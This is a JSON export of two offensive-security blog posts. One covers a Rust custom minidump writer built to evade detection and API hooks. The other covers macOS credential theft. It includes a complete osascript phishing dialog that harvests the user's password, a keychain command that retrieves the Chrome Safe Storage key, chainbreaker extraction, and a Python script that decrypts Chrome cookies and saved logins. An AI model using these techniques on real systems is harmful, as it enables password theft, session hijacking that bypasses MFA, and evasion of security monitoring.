[{"categories":[],"contents":"previously, we discussed/mapped all the fundamental Windows PE structures and parsing capabilities needed by every other component for our custom minidumper tool. in this part, we\u0026rsquo;ll define the minidump format structures that build upon the PE definitions. following that, we\u0026rsquo;ll learn how to implement the actual dumping logic using the types defined.\ndata types in the context of minidumps, data types refer to the structured representations of various elements within the dump file. these types are defined to mirror the Windows minidump format specs. an example of this is the MINIDUMP_TYPE enumeration , aka minidumpapiset.h. this enum identifies the type of information written to the minidump file by the MiniDumpWriteDump function .\nMINIDUMP_TYPE typedef enum _MINIDUMP_TYPE { MiniDumpNormal = 0x00000000, MiniDumpWithDataSegs = 0x00000001, MiniDumpWithFullMemory = 0x00000002, MiniDumpWithHandleData = 0x00000004, MiniDumpFilterMemory = 0x00000008, MiniDumpScanMemory = 0x00000010, MiniDumpWithUnloadedModules = 0x00000020, MiniDumpWithIndirectlyReferencedMemory = 0x00000040, MiniDumpFilterModulePaths = 0x00000080, MiniDumpWithProcessThreadData = 0x00000100, MiniDumpWithPrivateReadWriteMemory = 0x00000200, MiniDumpWithoutOptionalData = 0x00000400, MiniDumpWithFullMemoryInfo = 0x00000800, MiniDumpWithThreadInfo = 0x00001000, MiniDumpWithCodeSegs = 0x00002000, MiniDumpWithoutAuxiliaryState = 0x00004000, MiniDumpWithFullAuxiliaryState = 0x00008000, MiniDumpWithPrivateWriteCopyMemory = 0x00010000, MiniDumpIgnoreInaccessibleMemory = 0x00020000, MiniDumpWithTokenInformation = 0x00040000, MiniDumpWithModuleHeaders = 0x00080000, MiniDumpFilterTriage = 0x00100000, MiniDumpWithAvxXStateContext = 0x00200000, MiniDumpWithIptTrace = 0x00400000, MiniDumpScanInaccessiblePartialPages = 0x00800000, MiniDumpFilterWriteCombinedMemory, MiniDumpValidTypeFlags = 0x01ffffff } MINIDUMP_TYPE; MINIDUMP_HEADER the main header structure that appears at the beginning of every minidump file is MINIDUMP_HEADER . it contains the signature (MINIDUMP_SIGNATURE = 0x504d444d or \u0026ldquo;MDMP\u0026rdquo; in ascii), version, the number of streams, timestamp, and flags (seen above).\ntypedef struct _MINIDUMP_HEADER { ULONG32 Signature; ULONG32 Version; ULONG32 NumberOfStreams; RVA StreamDirectoryRva; ULONG32 CheckSum; union { ULONG32 Reserved; ULONG32 TimeDateStamp; }; ULONG64 Flags; } MINIDUMP_HEADER, *PMINIDUMP_HEADER; MINIDUMP_DIRECTORY MINIDUMP_DIRECTORY contains the information needed to access a specific data stream in a minidump file. it defines the location + type of each stream in the minidump.\ntypedef struct _MINIDUMP_DIRECTORY { ULONG32 StreamType; MINIDUMP_LOCATION_DESCRIPTOR Location; } MINIDUMP_DIRECTORY, *PMINIDUMP_DIRECTORY; MINIDUMP_MEMORY_DESCRIPTOR the MINIDUMP_MEMORY_DESCRIPTOR defines a region (range) of memory in the minidump.\ntypedef struct _MINIDUMP_MEMORY_DESCRIPTOR { ULONG64 StartOfMemoryRange; MINIDUMP_LOCATION_DESCRIPTOR Memory; } MINIDUMP_MEMORY_DESCRIPTOR, *PMINIDUMP_MEMORY_DESCRIPTOR; MINIDUMP_THREAD MINIDUMP_THREAD contains information about a thread, including its ID, stack information, and context.\ntypedef struct _MINIDUMP_THREAD { ULONG32 ThreadId; ULONG32 SuspendCount; ULONG32 PriorityClass; ULONG32 Priority; ULONG64 Teb; MINIDUMP_MEMORY_DESCRIPTOR Stack; MINIDUMP_LOCATION_DESCRIPTOR ThreadContext; } MINIDUMP_THREAD, *PMINIDUMP_THREAD; MINIDUMP_MODULE MINIDUMP_MODULE represents a loaded module (DLL or an EXE) in the process.\ntypedef struct _MINIDUMP_MODULE { ULONG64 BaseOfImage; ULONG32 SizeOfImage; ULONG32 CheckSum; ULONG32 TimeDateStamp; RVA ModuleNameRva; VS_FIXEDFILEINFO VersionInfo; MINIDUMP_LOCATION_DESCRIPTOR CvRecord; MINIDUMP_LOCATION_DESCRIPTOR MiscRecord; ULONG64 Reserved0; ULONG64 Reserved1; } MINIDUMP_MODULE, *PMINIDUMP_MODULE; data serialization data serialization is the process of converting in-memory data structures into a format that can be written to disk or transmitted over a network. the minidump file itself is a container, which contains a number of typed \u0026ldquo;streams\u0026rdquo;, which contain some data according to its type attribute.\nminidumps preserve the endianness (little- or big-) of the platform they were generated on, since they contain lots of raw memory from the process. the serialization process must handle this to ensure cross-platform compatibility.\nsome structures in the minidump format require specific alignment. serialization must account for this as well, by adding padding wherever necessary.\nsince we\u0026rsquo;re going to be writing this in rust, there needs to be type conversion between native rust types and the binary representation required by the minidump format.\nstreams streams are the core organizational units within a minidump file. each stream contains a specific type of data about the dumped process.\nstream types, identified by a unique integer, basically describe the type of stream. for example: 3: ThreadListStream, 4: ModuleListStream, 5: MemoryListStream, 6: ExceptionStream or 7: SystemInfoStream.\nthe minidump file contains a directory of streams , allowing quick access to specific data without parsing the entire file.\nmany streams follow a common \u0026ldquo;List\u0026rdquo; format, consisting of a count followed by an array of entries, like MinidumpMemoryList (maps the crashing program’s runtime addresses, such as $rsp to ranges of memory in the minidump), MinidumpModuleList (includes info on all the modules/libraries that were linked into the crashing program; this enables symbolication, as you can map instruction addresses back to offsets in a specific library’s binary), or MinidumpThreadList (includes the registers and stack memory of every thread in the program at the time of the crash; this enables generating backtraces for every thread).\nthe minidump format also allows for custom stream types, enabling extensions to the format without breaking compatibility.\nto sum it up, we\u0026rsquo;ll need to refine rust structures that accurately represent these different data types, implement serialization logic for each type, organize the captured data into appropriate streams, and create a stream directory that allows efficient access to each stream.\nstructure design recalling that the minidump format is a structured representation of process memory and state, our format begins with a header that Windows debugging engines use to validate and parse dump files.\npub(crate) struct MinidumpHeaderR { pub(crate) signature: u32, // \u0026#39;MDMP\u0026#39; (0x504d444d) in ASCII pub(crate) version: u32, // Format version identifier pub(crate) number_of_streams: u32, // Count of data streams pub(crate) stream_directory_rva: RVA32\u0026lt;MINIDUMP_DIRECTORY\u0026gt;, // Pointer to stream listings pub(crate) checksum: u32, // Optional error checking value pub(crate) _time_date_stamp: u32, // UNIX timestamp of dump creation pub(crate) flags: u64, // Dump content indicators pub(crate) minidump_header_rva: *mut MINIDUMP_HEADER, // Self-reference for validation } the signature field contains \u0026lsquo;MDMP\u0026rsquo; in ASCII (0x504d444d), which debuggers use as a magic number to identify valid dump files. the version field indicates the minidump format version - our implementation uses version 0x0000000A, corresponding to Windows 10 and later formats.\nwhen this header is serialized, it\u0026rsquo;s written to the start of the dump file.\nimpl MinidumpHeaderR { pub(crate) fn serialize(\u0026amp;mut self, buf: \u0026amp;mut Vec\u0026lt;u8\u0026gt;) { let minidump_header = MINIDUMP_HEADER { Signature: self.signature, Version: self.version, NumberOfStreams: self.number_of_streams, StreamDirectoryRva: self.stream_directory_rva.0, CheckSum: self.checksum, Anonymous: Default::default(), Flags: self.flags, }; module state + PE image capture the module capturing system records the state of loaded modules (DLLs and EXEs) in the target process. this involves more than just recording names and addresses - we\u0026rsquo;ll need to capture the base address where the module is loaded, the size of the module in memory, the full module content from memory (might differ from disk), full path + name information, version, and debug data locations.\npub(crate) struct MinidumpModuleR { pub(crate) base: u64, // Module\u0026#39;s base address in process space pub(crate) size: u64, // Size of loaded module pub(crate) bytes: Vec\u0026lt;u8\u0026gt;, // Actual module content from memory pub(crate) name: String, // Module\u0026#39;s full path pub(crate) start_offset: RVA64\u0026lt;MINIDUMP_MODULE\u0026gt;, // Location in dump file } the module data is serialized through a complex process that preserves Windows PE format requirements:\nfn serialize(\u0026amp;mut self, buf: \u0026amp;mut Vec\u0026lt;u8\u0026gt;) { let minidump_mod = MINIDUMP_MODULE { BaseOfImage: self.base, SizeOfImage: self.size as u32, CheckSum: 0, TimeDateStamp: 0, ModuleNameRva: 0, VersionInfo: Default::default(), CvRecord: Default::default(), MiscRecord: Default::default(), Reserved0: 0, Reserved1: 0, }; this serialization process writes the module information in a format that Windows debugging tools expect. the ModuleNameRva field is particularly important - it\u0026rsquo;s fixed up after writing the name data:\npub(crate) fn fixup(\u0026amp;mut self, buf: \u0026amp;mut Vec\u0026lt;u8\u0026gt;) { let target_mod = self.start_offset.get_mut(buf.as_mut_ptr() as usize); let target_name = \u0026amp;self.name; // convert name to UTF-16 for Windows compatibility let mut utf16_buf: Vec\u0026lt;u8\u0026gt; = Vec::new(); for c in target_name.encode_utf16() { utf16_buf.extend_from_slice(\u0026amp;c.to_le_bytes()); } memory range capture system the memory range system implements the actual process memory capture mechanism. this involves tracking both the virtual address space layout and the actual memory content.\npub(crate) struct MinidumpMemory64ListR { pub(crate) _base_rva: RVA64\u0026lt;MINIDUMP_MEMORY_DESCRIPTOR64\u0026gt;, pub(crate) memory_ranges: Vec\u0026lt;MinidumpMemoryDescriptor64R\u0026gt;, pub(crate) list_ptr: Option\u0026lt;*mut MINIDUMP_MEMORY64_LIST\u0026gt; } each memory range represents a contiguous block of memory in the process.\npub(crate) struct MinidumpMemoryDescriptor64R { pub(crate) start_of_memory_range: u64, // Virtual address in process pub(crate) data_size: u64, // Size of memory block pub(crate) bytes: Vec\u0026lt;u8\u0026gt;, // Actual memory content } the memory capture process involves sophisticated filtering of memory regions.\nif (mem_info.State \u0026amp; MEM_COMMIT.0) == MEM_COMMIT.0 \u0026amp;\u0026amp; (mem_info.Type \u0026amp; MEM_MAPPED.0) != MEM_MAPPED.0 \u0026amp;\u0026amp; ((mem_info.Protect \u0026amp; PAGE_NOACCESS.0) != PAGE_NOACCESS.0 \u0026amp;\u0026amp; (mem_info.Protect \u0026amp; PAGE_EXECUTE.0) != PAGE_EXECUTE.0 \u0026amp;\u0026amp; (mem_info.Protect \u0026amp; PAGE_GUARD.0) != PAGE_GUARD.0) { // region accepted for capture } this filtering ensures we\u0026rsquo;ll only capture committed memory pages (i.e. those actually backing physical memory). it\u0026rsquo;ll also skip memory-mapped files to avoid capturing disk content, and respect memory protection (skip inaccessible pages, avoid executable memory that might trigger security mechanisms and handle guard pages that can cause exceptions).\nwhen memory is read, we use ReadProcessMemory with careful error handling.\nlet res = unsafe { ReadProcessMemory( h_target_proc, mem_info.BaseAddress as *const _, buffer.as_mut_ptr() as *mut _, mem_info.RegionSize, Some(\u0026amp;mut read), ) }; memory range serialization the memory range serialization process is complex because it must maintain proper alignment and ordering while handling variable-sized data. the process begins with the stream header.\npub(crate) fn serialize(\u0026amp;mut self, buf: \u0026amp;mut Vec\u0026lt;u8\u0026gt;, dir_info: \u0026amp;mut MinidumpDirectoryListR) { let offset_start = buf.len(); let number_of_ranges = self.memory_ranges.len(); let total_size = 16 + std::mem::size_of::\u0026lt;MINIDUMP_MEMORY_DESCRIPTOR64\u0026gt;() * number_of_ranges; the size calculation (16 + descriptor size * range count) has to account for 8 bytes for NumberOfMemoryRanges, 8 bytes for BaseRva, and the size of each memory descriptor structure.\nthe actual memory data is written sequentially after all descriptors.\nlet mem_dmp_start = offset_start + total_size; let first_e = self.memory_ranges[0].get(); let minidump_mem_list = MINIDUMP_MEMORY64_LIST { NumberOfMemoryRanges: number_of_ranges as u64, BaseRva: mem_dmp_start as u64, MemoryRanges: [first_e; 1], }; this structure is critical because Windows debuggers use the BaseRva field to locate the actual memory contents. the memory ranges are written in two phases: descriptor and content.\ndescriptor phase for idx in 1..self.memory_ranges.len() { let mem = \u0026amp;mut self.memory_ranges[idx]; mem.serialize(buf); } content phase pub(crate) fn fixup(\u0026amp;mut self, buf: \u0026amp;mut Vec\u0026lt;u8\u0026gt;) { println!(\u0026#34;Memory dmp start actually is {:#x}\u0026#34;, buf.len()); for idx in 0..self.memory_ranges.len() { let mem = \u0026amp;self.memory_ranges[idx]; buf.extend_from_slice(mem.bytes.as_slice()); } } this two-phase approach ensures that all memory descriptors are contiguous in the file, followed by all memory contents, making the dump file efficiently parseable.\nsystem information capture the system information capture process is more complex than simply querying API functions. to avoid detection and API hooks, we directly query the registry.\nMinidumpSystemInfoR: directly querying registry pub(crate) struct MinidumpSystemInfoR { pub(crate) processor_architecture: u16, pub(crate) processor_level: u16, pub(crate) processor_revision: u16, pub(crate) number_of_processors: u8, pub(crate) product_type: u8, pub(crate) major_version: u32, pub(crate) minor_version: u32, pub(crate) build_number: u32, pub(crate) platform_id: u32, pub(crate) csd_version_rva: RVA32\u0026lt;MINIDUMP_STRING\u0026gt;, // ... additional fields } the version information is obtained through direct registry access.\nfn get_likely_os_ver() -\u0026gt; OSVERSIONINFOEXW { let mut hkey = HKEY::default(); let ntstat = unsafe { RegOpenKeyExA( HKEY_LOCAL_MACHINE, PCSTR::from_raw(\u0026#34;SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\0\u0026#34;.as_ptr()), 0, KEY_READ | KEY_QUERY_VALUE, \u0026amp;mut hkey, ) }; we read multiple values to construct accurate version information.\nlet mut major_version = 0; let mut major_version_size = std::mem::size_of::\u0026lt;u32\u0026gt;(); let ntstat = unsafe { RegQueryValueExA( hkey, PCSTR::from_raw(\u0026#34;CurrentMajorVersionNumber\\0\u0026#34;.as_ptr()), None, Some(\u0026amp;mut REG_DWORD), Some(\u0026amp;mut major_version as *mut u32 as *mut _), Some(\u0026amp;mut major_version_size as *mut usize as *mut _), ) }; this direct registry access approach serves several purposes. for one, it bypassess potential API hooks and gets the actual installed version. it also accesses additional version details that aren\u0026rsquo;t available via standard APIs.\ndirectory stream management the directory stream system maintains the relationship between different data streams in the dump.\npub(crate) struct MinidumpDirectoryListR { pub(crate) directory: Vec\u0026lt;MinidumpDirectoryR\u0026gt;, } pub(crate) struct MinidumpDirectoryR { pub(crate) stream_type: u32, pub(crate) _location: MINIDUMP_LOCATION_DESCRIPTOR, pub(crate) start_offset: RVA64\u0026lt;MINIDUMP_DIRECTORY\u0026gt;, } each directory entry points to a specific type of data in the dump. the stream types include:\nModuleListStream (0x4): list of loaded modules\nMemory64ListStream (0x9): 64-bit memory ranges\nSystemInfoStream (0x7): system information\nThreadListStream (0x3): thread information\nthe directory serialization process maintains these relationships.\nfn serialize_directories( buf: \u0026amp;mut Vec\u0026lt;u8\u0026gt;, header: \u0026amp;mut MinidumpHeaderR, ) -\u0026gt; MinidumpDirectoryListR { let mut dirs = MinidumpDirectoryListR::default(); let minidump_header = unsafe { \u0026amp;mut *header.minidump_header_rva }; minidump_header.StreamDirectoryRva = buf.len() as u32; each directory entry maintains a stream type identifier, a location descriptor (offset and size), and the RVA to the actual stream data.\nRVA (Relative Virtual Address) implementation the RVA system is fundamental to both PE files and minidump formats. our implementation uses generic types to provide type safety and proper pointer arithmetic.\n#[derive(Copy, Clone, Default)] #[repr(transparent)] pub struct RVA32\u0026lt;T: ?Sized\u0026gt;(pub u32, pub core::marker::PhantomData\u0026lt;T\u0026gt;); #[derive(Copy, Clone, Default)] #[repr(transparent)] pub struct RVA64\u0026lt;T: ?Sized\u0026gt;(pub u64, pub core::marker::PhantomData\u0026lt;T\u0026gt;); the PhantomData marker is crucial here - it provides type information without affecting the memory layout. this enables the compiler to enforce type safety when dereferencing RVAs. the implementation provides safe access methods.\nimpl\u0026lt;T\u0026gt; RVA32\u0026lt;T\u0026gt; { pub fn get(\u0026amp;self, base_address: usize) -\u0026gt; \u0026amp;T { unsafe { \u0026amp;*((base_address + self.0 as usize) as *const T) } } pub fn get_mut(\u0026amp;mut self, base_address: usize) -\u0026gt; \u0026amp;mut T { unsafe { \u0026amp;mut *((base_address + self.0 as usize) as *mut T) } } } this system ensures that:\nRVAs can only be dereferenced with the correct base address\ntype information is preserved through the dereference operation\nmutable and immutable access is properly controlled\nmemory alignment requirements are maintained\nmemory reading + validation the actual process memory reading involves careful handling of Windows memory protection and state.\nreading process memory pub(crate) fn create_memory_desc64_list(h_proc: HPSS, h_target_proc: HANDLE) -\u0026gt; MinidumpMemory64ListR { let mut memory_desc64_list = MinidumpMemory64ListR::default(); loop { let mut mem_info = PSS_VA_SPACE_ENTRY::default(); let memory_entry_slice = unsafe { std::slice::from_raw_parts_mut( \u0026amp;mut mem_info as *mut PSS_VA_SPACE_ENTRY as *mut u8, std::mem::size_of::\u0026lt;PSS_VA_SPACE_ENTRY\u0026gt;(), ) }; validating memory the memory validation process checks multiple attributes.\nif (mem_info.State \u0026amp; MEM_COMMIT.0) == MEM_COMMIT.0 \u0026amp;\u0026amp; (mem_info.Type \u0026amp; MEM_MAPPED.0) != MEM_MAPPED.0 \u0026amp;\u0026amp; ((mem_info.Protect \u0026amp; PAGE_NOACCESS.0) != PAGE_NOACCESS.0 \u0026amp;\u0026amp; (mem_info.Protect \u0026amp; PAGE_EXECUTE.0) != PAGE_EXECUTE.0 \u0026amp;\u0026amp; (mem_info.Protect \u0026amp; PAGE_GUARD.0) != PAGE_GUARD.0) { each check serves a specific purpose:\nMEM_COMMIT ensures the page has physical storage allocated\nMEM_MAPPED check avoids reading memory-mapped files\nPAGE_NOACCESS check prevents access violations\nPAGE_EXECUTE check avoids potential security triggers\nPAGE_GUARD check prevents stack guard page exceptions\nreading validated memory regions when reading validated memory regions\nlet mut buffer: Vec\u0026lt;u8\u0026gt; = Vec::with_capacity(mem_info.RegionSize as usize); for _ in 0..mem_info.RegionSize { buffer.push(0); } let mut read = 0; let res = unsafe { ReadProcessMemory( h_target_proc, mem_info.BaseAddress as *const _, buffer.as_mut_ptr() as *mut _, mem_info.RegionSize, Some(\u0026amp;mut read), ) }; the reading process becomes:\npre-allocate a buffer to avoid reallocations maintain proper alignment for the target memory track actual bytes read vs requested handle partial reads correctly string handling + unicode support string handling in minidumps requires careful attention to Windows Unicode requirements.\npub(crate) fn fixup(\u0026amp;mut self, buf: \u0026amp;mut Vec\u0026lt;u8\u0026gt;) { let target_name = \u0026amp;self.name; let mut utf16_buf: Vec\u0026lt;u8\u0026gt; = Vec::new(); let target_name = target_name.trim_end_matches(\u0026#39;\\0\u0026#39;); for c in target_name.encode_utf16() { utf16_buf.extend_from_slice(\u0026amp;c.to_le_bytes()); } the MINIDUMP_STRING structure requires specific handling.\nlet minidump_str = MINIDUMP_STRING { Length: target_len as u32, Buffer: [0; 1], }; buf.extend_from_slice(unsafe { std::slice::from_raw_parts( \u0026amp;minidump_str.Length as *const u32 as *const u8, std::mem::size_of::\u0026lt;u32\u0026gt;(), ) }); now: string length is properly recorded, buffer is properly aligned, the format matches Windows debugger expectations, and Unicode strings are properly terminated.\nstream directory organization the minidump format organizes data through a stream directory system. each stream represents a different type of process information.\nlet dir_info = dir_info.directory .iter_mut() .find(|x| x.stream_type == ModuleListStream.0 as u32) .unwrap(); let target_dir = dir_info .start_offset .get_mut(buf.as_mut_ptr() as *mut _ as usize); the stream directory maintains crucial offset information.\ntarget_dir.Location.DataSize = module_list_size as u32; target_dir.Location.Rva = current_offset as u32; this organization serves several purposes:\nallows random access to specific data types\nmaintains proper alignment of all data\nenables stream size validation\nfacilitates proper memory mapping when loaded by debuggers\nmodule list serialization the module list stream requires careful ordering and alignment.\npub(crate) fn serialize(\u0026amp;mut self, buf: \u0026amp;mut Vec\u0026lt;u8\u0026gt;, dir_info: \u0026amp;mut MinidumpDirectoryListR) { let current_offset = buf.len(); let module_list_size = std::mem::size_of::\u0026lt;MINIDUMP_MODULE\u0026gt;() * self.modules.len() + 4; // +4 for NumberOfModules let module_list = MINIDUMP_MODULE_LIST { NumberOfModules: self.modules.len() as u32, Modules: [MINIDUMP_MODULE::default(); 1], }; the serialization process maintains crucial PE metadata:\nbase addresses of modules\nmodule sizes in memory\nmodule names and paths\ntime stamps and checksums\ndebug information references\neach module requires specific fixups:\npub(crate) fn fixup(\u0026amp;mut self, buf: \u0026amp;mut Vec\u0026lt;u8\u0026gt;) { for module in \u0026amp;mut self.modules { let target_mod = module.start_offset.get_mut(buf.as_mut_ptr() as usize); // Module name handling let target_name = \u0026amp;module.name; let mut utf16_buf: Vec\u0026lt;u8\u0026gt; = Vec::new(); for c in target_name.encode_utf16() { utf16_buf.extend_from_slice(\u0026amp;c.to_le_bytes()); } memory list organization the memory list stream requires careful organization to maintain proper memory mapping capabilities.\npub(crate) fn serialize(\u0026amp;mut self, buf: \u0026amp;mut Vec\u0026lt;u8\u0026gt;, dir_info: \u0026amp;mut MinidumpDirectoryListR) { let offset_start = buf.len(); let mem_dmp_start = offset_start + std::mem::size_of::\u0026lt;MINIDUMP_MEMORY64_LIST\u0026gt;(); let minidump_mem_list = MINIDUMP_MEMORY64_LIST { NumberOfMemoryRanges: self.memory_ranges.len() as u64, BaseRva: mem_dmp_start as u64, MemoryRanges: [self.memory_ranges[0].get(); 1], }; the memory organization process:\nrecords the number of memory ranges\ncalculates proper RVAs for memory content\nmaintains proper alignment for all memory blocks\npreserves memory protection information\norders memory ranges for efficient access\nfinal dump assembly now, the final dump assembly process brings all streams together.\npub fn create_custom_minidump(h_proc: HPSS) -\u0026gt; Result\u0026lt;Vec\u0026lt;u8\u0026gt;, ()\u0026gt; { let mut clone_info = PSS_VA_CLONE_INFORMATION::default(); let mut header = create_header(); let mut sysinfo_stream = create_sysinfo_stream(); let mut module_list = create_module_list(h_proc, h_target_proc); let mut memory_desc64_list = create_memory_desc64_list(h_proc, h_target_proc); the assembly process follows a specific order:\nheader serialization\ndirectory creation\nsystem information stream\nmodule list stream\nmemory descriptor list\nactual memory content\nthe ordering is crucial because the header must point to valid stream directories. the streams must also maintain proper RVA chains and the memory content must align with descriptors. and finally, all offsets must be calculable from the header.\nthe final validation process includes:\n// Verify header signature if header.signature != 0x504d444d { return Err(()); } // Verify stream count matches directory if header.number_of_streams as usize != dir_info.directory.len() { return Err(()); } // Verify memory range consistency for range in \u0026amp;memory_desc64_list.memory_ranges { if range.data_size as usize != range.bytes.len() { return Err(()); } } now we can be sure that the dump file is properly formatted, all streams are correctly referenced, memory ranges are consistent, string data is properly encoded, and the dump can be loaded by Windows debuggers!\n","date":"2024-10-25","permalink":"//localhost:1313/posts/minidump-types/","section":"","summary":"","tags":[],"title":"advanced evasions, part 2: implementing minidump structures"},{"categories":[],"contents":"credential management in macOS is not dissimilar to that in Windows, but with some additional quirks. let\u0026rsquo;s take a look at some of the ways they can be accessed, both legitimately and illegitimately.\nsecurityd credentials are managed by the securityd process, and stored in the \u0026ldquo;keychain\u0026rdquo;. securityd is a daemon (i.e. a background process) that maintains different security contexts and handles the various cryptographic operations in macOS. it manages access to the items in the keychain, as well as Security Authorizations.\nsecurityd doesn\u0026rsquo;t directly store the date, but it does route all access to keychain items (which is where passwords, encryption keys, and certificates) are all stored. this way, private keys remain out of the user process address space and access to the data is controlled by securityd. the authorization database, located at /etc/authorization, contains the rules that securityd enforces for various operations.\nit\u0026rsquo;s important to note that users don\u0026rsquo;t interact directly with securityd. it\u0026rsquo;s also important to note that securityd collaborates with other daemons to maintain the separation and security, like trustd for certificate validation and nsurlsessiond for real-time validity checks.\nso, what exactly does it store?\naccess management as mentioned earlier, securityd manages access to the keychain, and is reponsible for the keychain\u0026rsquo;s encryption. the keychain (which is implemented as a SQLite database stored on the file system) is encrypted using a derived key . the encryption key for the login keychain is derived from the user\u0026rsquo;s password, and the key for the system keychain is known as a Master Key, which is stored separately from the keychain itself.\nbasically, securityd doesn\u0026rsquo;t store the PBKDF2 value of the user\u0026rsquo;s password directly, but it does manage a system of derived keys, access controls, and encryption to protect the contents of the keychain. the actual encryption keys are generated as needed and kept secure within the securityd process or hardware security modules.\nin the old days [\u0026lt;v10.11], users could obtain task ports for native apps and processes. these task ports would give complete control of the process to whoever was requesting them, and would grant read/write access to process memory. then, SIP was introduced.\nSIP SIP (System Integrity Protection) was designed to prevent malware from modifying protected files + folders. it protects several key system locations, like /System, /usr (but not /usr/local), /bin, /sbin, /var, and most pre-installed macOS apps. it restricts root access to these protected areas, thereby preventing code injection into system processes. it also limits runtime attachment and DTrace for protected executables, and sanitizes certain environment variables when calling system programs.\nSIP is enabled by default, but it can be disabled (or bypassed). to check its status, just type the following into the terminal: csrutil status\nfor (legitimate) app developers, the method to get access to credentials is simple: prompts. however, this method isn\u0026rsquo;t ideal for adversaries because it requires some level of elevated credentials. as always, we might be able to use this to our advantage.\ncredential acces via prompts users have become increasingly trained to authenticate to any popup on their machine. this leads us to an obvious next-step: create custom popup messages to ask for authentication, and record the credentials entered.\nfirst, set up the scripting environment by initializing osascript with javascript.\nosascript -l JavaScript -i inside the new environment, create an app object that represents the current application and enables standard additions, which allows us to use the dialog functions.\nlet app = Application.currentApplication() app.includeStandardAdditions = true now, for the main function. in OSA JavaScript, the run() function is the entry point of the script.\nfunction run() { } using shell commands, get the user\u0026rsquo;s full name + username.\nconst fullName = app.doShellScript(\u0026#39;id -F\u0026#39;) const username = app.doShellScript(\u0026#39;whoami\u0026#39;) define the title, text, default answer, and icon for the dialog. these will be displayed to the user.\nconst title = `Hello ${fullname}` const text = `Hi ${username}, please enter your password:` const answer = \u0026#34;\u0026#34; const icon = \u0026#34;caution\u0026#34; display the dialog, and wrap it in a try-catch block to handle cancellations or errors.\ntry { let propmpt = app.displayDialog(text, { defaultAnswer: answer, buttons: [\u0026#39;OK\u0026#39;, \u0026#39;Cancel\u0026#39;], defaultButton: \u0026#39;OK\u0026#39;, cancelButton: \u0026#39;Cancel\u0026#39;, withTitle: title, withIcon: icon, hiddenAnswer: true }) } catch (err){ // handle errors } the user should now enter their input (password) and click OK. if they click OK, this next bit will capture their input, display a confirmation, and return the input.\nif (prompt.buttonReturned === \u0026#39;OK\u0026#39;) { const userInput = prompt.textReturned app.displayAlert(`Password entered`, { message: `${fullName}, your password has been securely recorded.`, as: \u0026#34;informational\u0026#34; }) return userInput } the next bit is something that should never happen: display the password as a \u0026ldquo;debugging\u0026rdquo; comment.\nif (result !== null) { app.displayDialog(`Debug: The entered password was \u0026#34;${result}\u0026#34;`) } here it is in action.\nhere\u0026rsquo;s the full code if you want to try it yourself!\nlet app = Application.currentApplication() app.includeStandardAdditions = true function run() { // Get the current user\u0026#39;s full name const fullName = app.doShellScript(\u0026#39;id -F\u0026#39;) // Get the current user\u0026#39;s username const username = app.doShellScript(\u0026#39;whoami\u0026#39;) const title = `Hello ${fullName}` const text = `Hi ${username}, please enter your password:` const answer = \u0026#34;\u0026#34; const icon = \u0026#34;caution\u0026#34; try { let prompt = app.displayDialog(text, { defaultAnswer: answer, buttons: [\u0026#39;OK\u0026#39;, \u0026#39;Cancel\u0026#39;], defaultButton: \u0026#39;OK\u0026#39;, cancelButton: \u0026#39;Cancel\u0026#39;, withTitle: title, withIcon: icon, hiddenAnswer: true }) if (prompt.buttonReturned === \u0026#39;OK\u0026#39;) { const userInput = prompt.textReturned app.displayAlert(`Password entered`, { message: `${fullName}, your password has been securely recorded.`, as: \u0026#34;informational\u0026#34; }) return userInput // This will be the result of the run() function } } catch (err) { if (err.errorNumber === -128) { app.displayAlert(\u0026#34;Dialog cancelled\u0026#34;, { message: `${fullName}, you cancelled the password entry.`, as: \u0026#34;warning\u0026#34; }) } else { throw err } } return null // Return null if cancelled or an error occurred } // Execute the function and store the result const result = run() // Display the result (be careful with this in a real scenario!) if (result !== null) { app.displayDialog(`Debug: The entered password was \u0026#34;${result}\u0026#34;`) } credential access via chrome cookies browser cookies are a highly valuable vector for attackers. cookies contain session identifiers that allow users to stay logged in, so if an attacker steals them , they can impersonate the user without needing credentials.\narmed with valid session cookes, attackers can also bypass MFA because the system assumes the user has already completed the MFA process. let\u0026rsquo;s see how we can steal some cookies!\ncookie locations the \u0026ldquo;big 3\u0026rdquo; browsers store their cookies in different locations.\nsafari: ~/Library/Safari/LocalStorage/* firefox: ~/Library/Application Support/Firefox/Profiles/*.default/cookies.sqlite chrome: ~/Library/Application Support/Google/Chrome/Default/Cookies key retrieval chrome encrypts important user data files (cookies, passwords, payment information, authentication tokens) with a key stored in the user\u0026rsquo;s login keychain. this key is stored under Chrome Safe Storage in the keychain, and is base64 encoded.\nto retrieve the key, just use the following command: security find-generic-password -wa \u0026quot;Chrome Safe Storage\u0026quot;\nthis retrieved key can be used directly in the base64-encoded form for decryption operations.\nextraction using chainbreaker , you can extract a bunch of information from your macOS keychain. all you have to do is provide the path to your login keychain (usually at ~/Library/Keychains/login.keychain-db), and chainbreaker will output a bunch of decrypted information.\npython3 -m chainbreaker -pa ~/Library/Keychains/login.keychain-db -o output grep -C 20 \u0026#34;Chrome Safe Storage\u0026#34; output.log [+] Generic Password Record [-] Create DateTime: 2023-11-15 18:32:14 [-] Last Modified DateTime: 2023-11-15 18:32:14 [-] Description: [-] Creator: b\u0026#39;aapl\u0026#39; [-] Type: [-] Print Name: b\u0026#39;Chrome Safe Storage\u0026#39; [-] Alias: [-] Account: b\u0026#39;Chrome\u0026#39; [-] Service: b\u0026#39;Chrome Safe Storage\u0026#39; [-] Base64 Encoded Password: b\u0026#39;\u0026lt;redacted\u0026gt;\u0026#39; decryption using the base64 safe storage key, and the following script, you can decrypt the cookies + login data, and get a JSON output. you\u0026rsquo;ll need to provide the path to your login data: login_data = ~/Library/Application Support/Google/Chrome/Default/Login Data\nimport sqlite3 import os.path import base64 import urllib.parse import sys import json from Crypto.Cipher import AES from Crypto.Protocol.KDF import PBKDF2 salt = b\u0026#39;saltysalt\u0026#39; cookie_path = \u0026#34;\u0026#34; login_data = \u0026#34;\u0026#34; chrome_secret = \u0026#34;\u0026#34; iv = b\u0026#39; \u0026#39; * 16 length = 16 def chrome_decrypt(encrypted_value, key=None): # Encrypted cookies should be prefixed with \u0026#39;v10\u0026#39; according to the # Chromium code. Strip it off. encrypted_value = encrypted_value[3:] # Strip padding by taking off number indicated by padding # eg if last is \u0026#39;\\x0e\u0026#39; then ord(\u0026#39;\\x0e\u0026#39;) == 14, so take off 14. # You\u0026#39;ll need to change this function to use ord() for python2. def clean(x): return x[:-x[-1]].decode(\u0026#39;utf8\u0026#39;) cipher = AES.new(key, AES.MODE_CBC, IV=iv) decrypted = cipher.decrypt(encrypted_value) return clean(decrypted) 